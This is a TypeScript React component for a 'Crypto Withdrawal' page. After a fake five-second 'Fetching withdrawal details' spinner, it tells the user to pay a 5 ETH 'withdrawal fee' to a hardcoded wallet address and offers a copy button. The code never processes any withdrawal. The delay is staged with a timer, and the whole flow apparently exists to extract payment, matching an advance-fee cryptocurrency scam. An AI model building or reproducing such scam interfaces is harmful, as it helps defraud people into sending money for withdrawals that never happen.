import type React from "react"
import { useState } from "react"
import { Form, Button, Modal, Alert } from "react-bootstrap"

const cryptocurrencies = [ "Ethereum"]

const WithdrawalForm: React.FC = () => {
  const [selectedCrypto, setSelectedCrypto] = useState<string>("")
  const [amount, setAmount] = useState<string>("")
  const [showModal, setShowModal] = useState<boolean>(false)
  const [showAlert, setShowAlert] = useState<boolean>(false)

  const walletAddress = "0x1234567890abcdef"

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    setShowModal(true)

    // Simulate fetching withdrawal details
    setTimeout(() => {
      setShowModal(false)
      setShowAlert(true)
    }, 5000)
  }

  const handleCopy = () => {
    navigator.clipboard.writeText(walletAddress).then(() => {
      alert("Wallet address copied to clipboard!")
    }).catch((err) => {
      alert("Failed to copy wallet address: " + err)
    })
  }

  return (
    <div className="container mt-5">
      <h2 className="mb-4">Crypto Withdrawal</h2>
      <Form onSubmit={handleSubmit}>
        <Form.Group className="mb-3">
          <Form.Label>Select Cryptocurrency</Form.Label>
          <Form.Select value={selectedCrypto} onChange={(e) => setSelectedCrypto(e.target.value)} required>
            <option value="">Choose...</option>
            {cryptocurrencies.map((crypto) => (
              <option key={crypto} value={crypto}>
                {crypto}
              </option>
            ))}
          </Form.Select>
        </Form.Group>

        <Form.Group className="mb-3">
          <Form.Label>Amount</Form.Label>
          <Form.Control
            type="number"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="Enter amount"
            required
          />
        </Form.Group>

        <Button variant="primary" type="submit">
          Withdraw
        </Button>
      </Form>

      <Modal show={showModal} centered backdrop="static" keyboard={false}>
        <Modal.Body>
          <div className="text-center">
            <div className="spinner-border text-primary" role="status">
              <span className="visually-hidden">Loading...</span>
            </div>
            <p className="mt-2">Fetching withdrawal details...</p>
          </div>
        </Modal.Body>
      </Modal>

      <Alert show={showAlert} variant="danger" onClose={() => setShowAlert(false)}  className="mt-3 text-center">
        Please pay withdrawal fee of 5ETH to complete your transaction.
        <div>Wallet Address</div>
        <div>{walletAddress}</div>
        <Button onClick={handleCopy}>Copy Wallet Address</Button>
      </Alert>
    </div>
  )
}

export default WithdrawalForm
